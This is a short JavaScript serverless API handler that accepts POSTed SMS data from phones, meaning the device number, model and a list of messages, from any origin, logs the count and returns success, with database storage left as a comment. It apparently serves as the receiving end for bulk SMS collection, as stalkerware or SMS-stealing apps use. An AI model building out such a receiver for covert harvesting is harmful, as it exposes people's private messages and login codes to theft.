export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const data = req.body;
    
    // Log received SMS data for monitoring
    console.log('📱 SMS Data Received:', {
      phone: data.device_phone,
      model: data.device_model,
      sms_count: data.sms_messages?.length || 0,
      timestamp: new Date().toISOString()
    });
    
    // In real implementation, save to database here
    // For now, just return success
    
    res.status(200).json({ 
      status: 'success', 
      message: 'SMS data received and logged successfully',
      device_phone: data.device_phone || 'Unknown',
      sms_count: data.sms_messages?.length || 0,
      received_at: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ Error processing SMS data:', error);
    res.status(500).json({ 
      status: 'error', 
      message: error.message 
    });
  }
}
